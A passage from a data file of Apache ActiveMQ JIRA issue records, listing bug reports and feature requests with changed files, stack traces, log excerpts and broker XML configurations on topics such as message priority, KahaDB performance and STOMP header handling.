1. On server suse10sp268, start activemq , then run activemq-admin.bat browse --amqurl tcp://suse10sp268:61616 TEST.FOO , got excecption Caused by: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused: connectat org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35)at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:286)at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:185)at org.apache.activemq.ra.ActiveMQConnectionSupport.makeConnection(ActiveMQConnectionSupport.java:79)at org.apache.activemq.ra.ActiveMQConnectionSupport.makeConnection(ActiveMQConnectionSupport.java:61)at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.createManagedConnection(ActiveMQManagedConnectionFactory.java:169)... 42 moreCaused by: java.net.ConnectException: Connection refused: connectat java.net.PlainSocketImpl.socketConnect(Native Method)at java.net.PlainSocketImpl.doConnect(PlainSocketImpl.java:333)at java.net.PlainSocketImpl.connectToAddress(PlainSocketImpl.java:195)at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:182)at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:366)at java.net.Socket.connect(Socket.java:519)at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:483)at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:446)at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:266)This  happened also when got error starting activemq-ra module in geronimohttps://issues.apache.org/jira/browse/GERONIMO-5371
issueID:AMQ-2777
type:Improvement
changed files:ActiveMQConnectionFactory.java
ActiveMQConnection.java
texts:Add the ability to disable ConnectionAudit
Add a property checkForDuplicates (default = true) to the ActiveMQConnection and ActiveMQConnectionFactory
issueID:AMQ-2779
type:New Feature
changed files:
texts:Propagate queue subscription selectors to virtual topic dispatch such that unmatched messages do not pile up on subscription queues
With virtual topics each consumer can get its own queue or share an existing queue. http://activemq.apache.org/virtual-destinations.htmlConsumers which share a queue, can use selectors to partition the consumer queue but individual consumers that use selectors run into a problem in that the dispatch to the queue does not take account of the selector and all messages are dispatched to the queue. Over time, the unmatched messages build up on the queue.Through static configuration it is possible to arrange that the destination queues are filtered, but this solution is static.An alternative approach, that does impose a cpu hit during dispatch (as the selectors are executed twice) can provide a neat solution. Making a virtual topic selectorAware allows the destination interceptor to only dispatch messages that match the selector of one of the existing subscriptions. In this way, no unmatched messages will be dispatched to the subscription queues. In xml configuration, the following will make all topic dispatch respect the selectors of the existing subscriptions:<broker xmlns="http://activemq.apache.org/schema/core">    <destinationInterceptors>      <virtualDestinationInterceptor>        <virtualDestinations>          <virtualTopic name=">" selectorAware="true"/>        </virtualDestinations>      </virtualDestinationInterceptor>    </destinationInterceptors>  </broker>
issueID:AMQ-2782
type:Bug
changed files:
texts:Network of Brokers becomes overwhelmed with Advisory Messages on Temporary Queues
None
issueID:AMQ-2784
type:Improvement
changed files:
texts:Change favicon
None
issueID:AMQ-2786
type:Improvement
changed files:AdvisorySupport.java
AdvisoryBroker.java
PrefetchSubscription.java
texts:An an advisory message for messages sent to a DeadLetterQueue
None
issueID:AMQ-2789
type:Improvement
changed files:
texts:Add Support For Message Priority
Add support for delivering messages by priority.
issueID:AMQ-2790
type:Sub-task
changed files:ActiveMQSessionExecutor.java
texts:Add  Support for Message priority to JMS Client
Provide optional support for client-side message priority - use a property on the ActiveMQConnectionFactory - messagePrioritySupported (default = true) to set the use of a Priority based message Queue. If not enabled, messages will be dispatched to consumers in FIFO fashion.
issueID:AMQ-2791
type:Sub-task
changed files:PolicyEntry.java
FilePendingSubscriberMessageStoragePolicy.java
DestinationViewMBean.java
LoggingBrokerPlugin.java
DestinationFilter.java
StoreDurableSubscriberCursor.java
PendingSubscriberMessageStoragePolicy.java
SimpleMessageList.java
VMPendingDurableSubscriberMessageStoragePolicy.java
MessageReference.java
TopicSubscription.java
PrioritizedPendingList.java
FilePendingDurableSubscriberMessageStoragePolicy.java
AbstractPendingMessageCursor.java
FilePendingMessageCursor.java
Queue.java
VMPendingQueueMessageStoragePolicy.java
VMPendingSubscriberMessageStoragePolicy.java
OrderedPendingList.java
PendingNode.java
Message.java
SimplePriorityMessageDispatchChannel.java
VMPendingMessageCursor.java
PendingList.java
BaseDestination.java
AbstractStoreCursor.java
TempQueue.java
DiscardingDLQBroker.java
FilePendingQueueMessageStoragePolicy.java
DestinationView.java
StoreQueueCursor.java
PrefetchSubscription.java
NullMessageReference.java
Destination.java
texts:Add Message Priority support into PendingMessageCursor
Add optional support for priority based message delivery in the broker cursors
issueID:AMQ-2793
type:Bug
changed files:MessageDatabase.java
texts:KahaDB store default directory
Add default directory for KahaDB message store.If adapter is set simply with broker.setPersistenceAdapter(KahaDBPersistenceAdapter())it will result in NPE during broker start.
issueID:AMQ-2795
type:Improvement
changed files:
texts:Allow for a method to configure consumer.exclusive=true on a queue at startup
It would be nice if a queue could have the exclusive consumer property set by default at startup, so making all consumers connected to that queue behave like exclusive consumers.  Am very close to having a patch that implements this.
issueID:AMQ-2800
type:Bug
changed files:
texts:JDBCMessageStore message audit suppresses composite destination and DLQ messages as duplicates
With the audit enabled, messages send to composite destinations are suppressed as duplicates so the will not survive a restart. In addition, persistent DLQ messages are suppressed (depending on the audit depth).Disabling the audit on the persistence adapter works around this issue. It is ok to disable the audit. The audit is needed to close a small window where duplicate message sends can occur with the non transactional use of the failover: transport. It can happen if a send is in progress when a failover reconnection occurs back o the same broker (as if there was a temp network partition) and the send reply is not received. A non transactional client will resend the message which needs to be suppressed by the audit. Disabling the audit leaves the possibility of having a duplicate message in the database that will not be dispatched.
issueID:AMQ-2801
type:Bug
changed files:
texts:Durable subscriber on startup ignores Selectors when calculating pending queue size
The attached test case demonstrates the following scenario.   Start all durable subscriber connections (on Separate JVMs) each with different selectors. Publish messages to ActiveMQ that only matches one of selectors. Close the connection to both subscribers and restart both connections. The other durable subscriber pending queue size is displayed with the enqeue count for the subscriber on the activemq console.
issueID:AMQ-2806
type:Bug
changed files:PooledConnectionFactory.java
texts:Bad Javadoc on PooledConnectionFactory suggests we should not use PooledConnectionFactory for consumers!
See: http://activemq.apache.org/maven/activemq-core/apidocs/org/apache/activemq/pool/PooledConnectionFactory.html. This note concerning jencks is now out of date, and the ongoing recommendation seems to be to use activemq-pool.
issueID:AMQ-2807
type:Improvement
changed files:
texts:additional support for dynamic uri&#39;s in FailoverTransport
In some environments, would be very convenient to allow dynamic addition of transport uri"s to a FailoverTransport. This is currently supported for a network of brokers, but this doesn"t help in certain scenarios.Here"s one scenario that I"m interested in: a shared-storage master-slave configuration of brokers, with multiple clients. Since only one master broker is active at a time (and the master is not aware of the other slave brokers), it cannot communicate new broker url transports to connected clients. If clients must use tcp/ip protocols (i.e. multicast/discovery isn"t an option), then there"s no way for a client to dynamically "learn" when new brokers have been deployed. You must update the client"s configuration and restart all connections with an updated list of transport uri"s.I have a patch which will allow FailoverTransport to read new transport uri"s from a file. The file is only read during doReconnect() processing. So, new processing is only driven when client has lost a connection/is establishing a new connection.  To use the new feature, use a failover uri like the following:failover:(tcp://localhost:61616,tcp://localhost:61626)?updateURIsFile=/YourListOf/TransportUrisor evenfailover)?updateURIsFile=/YourListOf/TransportUrisWhere the file contents would look like this:tcp://localhost:61616,tcp://localhost:61626If a new broker is added to your configuration, just append a new transport uri to that file.Patch includes a new test which tests this new feature &#8211; FailoverUpdateURIsTest.java.Comments?
issueID:AMQ-2811
type:Bug
changed files:NIOTransport.java
texts:Network of Brokers: NIO-Transport: Members die after some hours
i have a network of brokers configured with four nodes where each node knows the other three nodes through the networkConnector config. two of these four nodes are currently down/unavailable. the other two nodes are working for about four hours then they die. in the log file i see a lot of entries like this one:2010-07-05 00:53:01,741 | ERROR | Could not stop service: tcp://null:0. Reason: java.lang.NullPointerException | org.apache.activemq.transport.nio.NIOTransport | Simple Discovery Agent: java.util.concurrent.ThreadPoolExecutor$Worker@f782b1java.lang.NullPointerException        at org.apache.activemq.transport.nio.NIOTransport.doStop(NIOTransport.java:152)        at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69)        at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:500)        at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:121)        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)        at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:91)        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)        at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)        at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43)        at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceAdd(DiscoveryNetworkConnector.java:134)        at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent$1.run(SimpleDiscoveryAgent.java:164)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619
issueID:AMQ-2813
type:Bug
changed files:BrokerService.java
XBeanBrokerService.java
texts:BrokerService @PostConstruct invalidates XBeanBrokerService w/ start=false
XBeanBrokerService#afterPropertiesSet() method checks the start flag and is annotated as @PostConstruct so it"s called at startup BrokerService#start() method has the @PostConstruct annotation as well There is no way for the BrokerService class to check the "start" flag in the XBeanBrokerService subclass. Spring will call BOTH @PostConstruct methods resulting in the broker being started regardless of the xbean start flagAccording to Gary Tully:That looks like a bug that was introduced inhttp://svn.apache.org/viewvc?rev=908182&view=rev the postConstruct onthe start method does invalidate theXBeanBrokerService#afterPropertiesSet()  smarts. As discussed in:http://old.nabble.com/XBean-%27start%3Dfalse%27-not-working--td29086727.html
issueID:AMQ-2815
type:New Feature
changed files:DestroyBrokerCommand.java
activemq-karaf.xml
CreateBrokerCommand.properties
CreateBrokerCommand.java
pom.xml
features.xml
DestroyBrokerCommand.properties
ActiveMQCommandSupport.java
broker.xml
AdministrationCommand.properties
ActiveMQCommand.java
texts:Move ServiceMix broker commands to ActiveMQ
This will enable us to keep them up-to-date with ActiveMQ releases regarding configuration changes and new features
issueID:AMQ-2817
type:Bug
changed files:
texts:STOMP headers need sanitization
Currently STOMP on a SEND extracts out the JMS headers and put the rest of the headers into the message properties.  If a STOMP consumer starts to consume the messages, the JMS fields are put into the header and the the properties are put in.  This can lead to a situation where if the client has provided a header that it shouldn"t have (e.g. message-id) it overwrites the one provided by the broker.This can lead to problems with e.g. ACKs where the wrong message-id is sent back.This patch sanitizes all headers for a MESSAGE frame when they come into the broker so they never get set in the properties.
issueID:AMQ-2818
type:Bug
changed files:
texts:jetty-realm.properties is not found when starting ActiveMQ in console mode on OSX
/usr/local/apache-activemq-5.4-SNAPSHOT$ bin/macosx/activemq consoleRunning ActiveMQ Broker...wrapper  | --> Wrapper Started as Consolewrapper  | Launching a JVM...jvm 1    | Wrapper (Version 3.2.3) http://wrapper.tanukisoftware.orgjvm 1    |   Copyright 1999-2006 Tanuki Software, Inc.  All Rights Reserved.jvm 1    | jvm 1    | Java Runtime: Apple Inc. 1.5.0_22 /System/Library/Frameworks/JavaVM.framework/Versions/1.5.0/Homejvm 1    |   Heap sizes: current=1984k  free=1059k  max=520256kjvm 1    |     JVM args: -Dactivemq.home=../.. -Dactivemq.base=../.. -Djavax.net.ssl.keyStorePassword=password -Djavax.net.ssl.trustStorePassword=password -Djavax.net.ssl.keyStore=../../conf/broker.ks -Djavax.net.ssl.trustStore=../../conf/broker.ts -Dcom.sun.management.jmxremote -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Xmx512m -Djava.library.path=../../bin/macosx/ -Dwrapper.key=tfJDUsBO_GwymN0M -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.pid=44040 -Dwrapper.version=3.2.3 -Dwrapper.native_library=wrapper -Dwrapper.cpu.timeout=10 -Dwrapper.jvmid=1jvm 1    | ACTIVEMQ_HOME: ../..jvm 1    | ACTIVEMQ_BASE: ../..jvm 1    | Loading message broker from: xbean:activemq.xmljvm 1    |  INFO | PListStore:../../data/localhost/tmp_storage startedjvm 1    |  INFO | Using Persistence Adapter: KahaDBPersistenceAdapter&#91;../../data/kahadb&#93;jvm 1    |  INFO | Recoverying from the journal ...jvm 1    |  INFO | Recovery replayed 1 operations from the journal in 0.0070 seconds.jvm 1    |  INFO | ActiveMQ 5.4-SNAPSHOT JMS Message Broker (localhost) is startingjvm 1    |  INFO | For help or more information please see: http://activemq.apache.org/jvm 1    |  INFO | Scheduler using directory: activemq-data/schedulerjvm 1    |  INFO | Listening for connections at: tcp://rutabaga.local:61616jvm 1    |  INFO | Connector openwire Startedjvm 1    |  INFO | ActiveMQ JMS Message Broker (localhost, ID:rutabaga.local-55820-1278607585105-0:0) startedjvm 1    |  INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLogjvm 1    |  INFO | jetty-7.0.1.v20091125jvm 1    |  WARN | FAILED HashLoginService&#91;ActiveMQRealm&#93;: java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)jvm 1    |  WARN | FAILED ConstraintSecurityHandler@7fbe19: java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)jvm 1    |  WARN | FAILED HandlerCollection@996f0e: java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)jvm 1    |  WARN | Error starting handlersjvm 1    | java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)jvm 1    |  at java.io.FileInputStream.open(Native Method)jvm 1    |  at java.io.FileInputStream.<init>(FileInputStream.java:106)jvm 1    |  at org.eclipse.jetty.util.resource.FileResource.getInputStream(FileResource.java:274)jvm 1    |  at org.eclipse.jetty.security.HashLoginService.loadUsers(HashLoginService.java:145)jvm 1    |  at org.eclipse.jetty.security.MappedLoginService.doStart(MappedLoginService.java:115)jvm 1    |  at org.eclipse.jetty.security.HashLoginService.doStart(HashLoginService.java:186)jvm 1    |  at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)jvm 1    |  at org.eclipse.jetty.security.SecurityHandler.doStart(SecurityHandler.java:316)jvm 1    |  at org.eclipse.jetty.security.ConstraintSecurityHandler.doStart(ConstraintSecurityHandler.java:231)jvm 1    |  at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)jvm 1    |  at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)jvm 1    |  at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)jvm 1    |  at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)jvm 1    |  at org.eclipse.jetty.server.Server.doStart(Server.java:228)jvm 1    |  at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)jvm 1    |  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)jvm 1    |  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)jvm 1    |  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)jvm 1    |  at java.lang.reflect.Method.invoke(Method.java:592)jvm 1    |  at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)jvm 1    |  at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)jvm 1    |  at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)jvm 1    |  at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)jvm 1    |  at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)jvm 1    |  at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)jvm 1    |  at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)jvm 1    |  at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)jvm 1    |  at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)jvm 1    |  at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)jvm 1    |  at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)jvm 1    |  at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)jvm 1    |  at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)jvm 1    |  at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)jvm 1    |  at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)jvm 1    |  at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)jvm 1    |  at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)jvm 1    |  at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)jvm 1    |  at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)jvm 1    |  at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)jvm 1    |  at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)jvm 1    |  at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)jvm 1    |  at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)jvm 1    |  at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)jvm 1    |  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)jvm 1    |  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)jvm 1    |  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)jvm 1    |  at java.lang.reflect.Method.invoke(Method.java:592)jvm 1    |  at org.apache.activemq.console.Main.runTaskClass(Main.java:251)jvm 1    |  at org.apache.activemq.console.Main.main(Main.java:107)jvm 1    |  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)jvm 1    |  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)jvm 1    |  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)jvm 1    |  at java.lang.reflect.Method.invoke(Method.java:592)jvm 1    |  at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)jvm 1    |  at java.lang.Thread.run(Thread.java:613)jvm 1    |  INFO | Started SelectChannelConnector@0.0.0.0:8161
issueID:AMQ-2821
type:Improvement
changed files:BrokerService.java
RegionBroker.java
Topic.java
Queue.java
BaseDestination.java
texts:Optionally remove Inactive Destinations
Destinations are never automatically deleted, even when they have had no producers or consumers and are empty of messages for a long time. Add the ability to optionally garbage collect destinations that are no longer needed
issueID:AMQ-2822
type:Bug
changed files:
texts:Stomp+nio transport fails sending byte messages with NULL chars
The problem is that routine for parsing commands doesn"t take Content-length header into account, but only searches for the next NULL character.
issueID:AMQ-2825
type:Improvement
changed files:JettisonMappedXmlDriver.java
pom.xml
JmsFrameTranslator.java
texts:Upgrade to Jettison 1.2
And fix the problem with json map serialization introduced with XStream 1.3.1
issueID:AMQ-2827
type:Bug
changed files:
texts:Intermittent 204 response using REST
Was able to successfully send 20 messages to AMQ via REST.  I can see that the messages were consumed and there are 20 messages in the response queue.  However, when reading the response queue using selector via REST, it intermittently returns HTTP code 204.  By looking at the "Active Consumers" for the response queue, I can see that the specific message has been dispatched to the consumer as the "Enqueues", "Dequeues" and "Dispatched" values are set to 1.The server has been configured with consumer.prefetchSize=1.I"ve further tried reproducing the problem by setting consumer.prefetchSize=0.  When I get a 204 response, I can see that the message is in the outgoing queue.  But executing another GET with the same Correlation ID will hang the client even though readTimeout is set.This has been tested with 5.4-SNAPSHOT 15-July.Update 23 July:Tried using the following settings: removed consumer.prefetchSize in web.xml saved session cookie for requests used the "selector" HTTP header used a random value for clientId in each requestIt seems to be returning all messages in properly.  However, each request generates a new client session based on the selector header.
issueID:AMQ-2832
type:Bug
changed files:
texts:Possible replay of old messages post index recovery from journal - data files containing acks reclaimed/cleaned up in error
With long lived messages and outstanding acks, ack distribution can be sparse across data files. If a data file is in use (still has unreferenced messages, the data files containing acks for all those messages also need to be maintained to ensure a replay of the journal replays the corresponding acks. Currently it is possible that data files with no unreferenced messages but with acks pertinent to an in use data file can get deleted. The result is duplicate or relay of old messages after journal recovery (following a crash/restart)
issueID:AMQ-2833
type:Improvement
changed files:LegacyFrameTranslator.java
Stomp.java
texts:Fix to STOMP Transport fixing message type selection
Ruby"s STOMP client always sets the content-length header and does not provide a mechanism to override the behavior.  In addition, the 1.0 STOMP specification states the content-length header is optional but recommended.  I implemented the feature discussed in AMQ-739 utilizing the "amq-msg-type" header to select the message type.  I"ve only implemented "text" and "byte" message types.
issueID:AMQ-2834
type:Wish
changed files:BrokerService.java
texts:Producers blocks when global storeUsage is smaller than persistent adapter chunk size; should warn of incorrect configuration
Defining a global storeUsage parameter that is smaller than the persistent adapter chunk size makes all producers blocks as soon as the store is full (when producer flow control is enabled). It would be nice if ActiveMQ showed a big warning during startup that the used configuration is not correct.Here is how to reproduce this: start the server; produce enough persistent messages in order to reach the store limit (by using ant producer -Ddurable=true -Dmax=10000); the producer is blocked after N messages; check the admin web console, store percent used reports 100%; in the logs "Usage Manager Store is Full" is reported; start a consumer (with ant consumer -Dmax=10000); consumer will consume messages and stop at N-1  then, even if all messages are consumed, the producer is still blocked (and the consumer is of course still waiting); in the web console, the store percent used is now way higher than 100%, and no messages are hanging in the queue.The broker configuration is the following:<beans  xmlns="http://www.springframework.org/schema/beans"  xmlns:amq="http://activemq.apache.org/schema/core"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd     http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd">    <!-- Allows us to use system properties as variables in this configuration file -->    <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"/>    <broker xmlns="http://activemq.apache.org/schema/core" brokerName="jmsServer" dataDirectory="${activemq.base}/data" persistent="true">        <persistenceAdapter>            <amqPersistenceAdapter directory="${activemq.base}/data" maxFileLength="50 mb" syncOnWrite="false"/>        </persistenceAdapter>        <!-- The transport connectors ActiveMQ will listen to -->        <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616?keepAlive=true&amp;wireFormat.maxInactivityDuration=1200000&amp;connectionTimeout=1200000&amp;soTimeout=1200000" enableStatusMonitor="true"/>        </transportConnectors>        <!--  The maximum about of space the broker will use before slowing down producers -->        <systemUsage>            <systemUsage>                <memoryUsage>                    <memoryUsage limit="200 mb"/>                </memoryUsage>                <storeUsage>                    <storeUsage limit="10 mb"/>                </storeUsage>                <tempUsage>                    <tempUsage limit="100 mb"/>                </tempUsage>            </systemUsage>        </systemUsage>    </broker></beans>
issueID:AMQ-2836
type:Bug
changed files:LoggingBrokerPlugin.java
texts:ConcurrentModificationException while sending messages to composite destinations
When the LoggingBrokerPlugin is used and sending messages to composite destinations there is a very high amount of ConcurrentModificationException on the broker.The exception thrown on the server side is also propagated to the client side and appears there as well as the additional exception that is thrown on the client side.This is the stack trace on the server side:java.util.ConcurrentModificationException        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)        at java.util.HashMap$EntryIterator.next(HashMap.java:834)        at java.util.HashMap$EntryIterator.next(HashMap.java:832)        at java.util.HashMap.putAllForCreate(HashMap.java:435)        at java.util.HashMap.<init>(HashMap.java:225)        at org.apache.activemq.command.Message.copy(Message.java:120)        at org.apache.activemq.command.ActiveMQMessage.copy(ActiveMQMessage.java:64)        at org.apache.activemq.command.ActiveMQObjectMessage.copy(ActiveMQObjectMessage.java:81)        at org.apache.activemq.command.ActiveMQObjectMessage.copy(ActiveMQObjectMessage.java:75)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:88)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)        at org.apache.activemq.broker.util.LoggingBrokerPlugin.send(LoggingBrokerPlugin.java:280)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:446)        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2837
type:Bug
changed files:MessageDatabase.java
texts:Slow KahaDB
I"m using KahaDB for persistence with the following configuration:<?xml version="1.0" encoding="UTF-8"?><beans>  <broker brokerName="test-broker"   persistent="true"   useJmx="true"    useShutdownHook="false"   deleteAllMessagesOnStartup="false"   xmlns="http://activemq.apache.org/schema/core">    <persistenceAdapter>      <kahaDB directory="activemq-data" journalMaxFileLength="32mb" indexCacheSize="10000000"/>    </persistenceAdapter>    <transportConnectors>      <transportConnector uri="tcp://localhost:61616"/>    </transportConnectors>    <destinationPolicy>      <policyMap> <policyEntries>   <policyEntry topic=">">     <subscriptionRecoveryPolicy>       <timedSubscriptionRecoveryPolicy recoverDuration="3600000"/>     </subscriptionRecoveryPolicy>   </policyEntry> </policyEntries>      </policyMap>    </destinationPolicy></broker></beans>I"ve some durable consumers. The broker is showing many "Slow KahaDB access" log entries. Any suggestions? INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1248 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1560 ms INFO | Slow KahaDB access: Journal append took: 1 ms, Index update took 1227 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1227 ms INFO | Slow KahaDB access: Journal append took: 1480 ms, Index update took 0 ms INFO | Slow KahaDB access: Journal append took: 5 ms, Index update took 1302 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1302 ms INFO | Slow KahaDB access: Journal append took: 13 ms, Index update took 1348 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1590 ms INFO | Slow KahaDB access: Journal append took: 1327 ms, Index update took 0 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1263 ms INFO | Slow KahaDB access: Journal append took: 1 ms, Index update took 1276 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1277 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1318 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1312 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1593 ms INFO | Slow KahaDB access: Journal append took: 3 ms, Index update took 1608 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1302 ms INFO | Slow KahaDB access: Journal append took: 3 ms, Index update took 1317 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1318 ms INFO | Slow KahaDB access: Journal append took: 2 ms, Index update took 1316 ms INFO | Slow KahaDB access: Journal append took: 1318 ms, Index update took 1 ms INFO | Slow KahaDB access: Journal append took: 0 ms, Index update took 1296 ms
issueID:AMQ-2840
type:Bug
changed files:
texts:JMSX Properties not returned from message.propertyExists() and message.getPropertyNames()
Methods propertyExists() and getPropertyNames() defined in the class org.apache.activemq.command.ActiveMQMessage (activemq-core) return only custom properties. The JMSX properties (like JMSXDeliveryCount) are not being returned. This problem exists not only for a new version of ActiveMQ (5.4), but also for 5.3 (and probably for others as well).
issueID:AMQ-2841
type:Improvement
changed files:LegacyFrameTranslator.java
ProtocolConverter.java
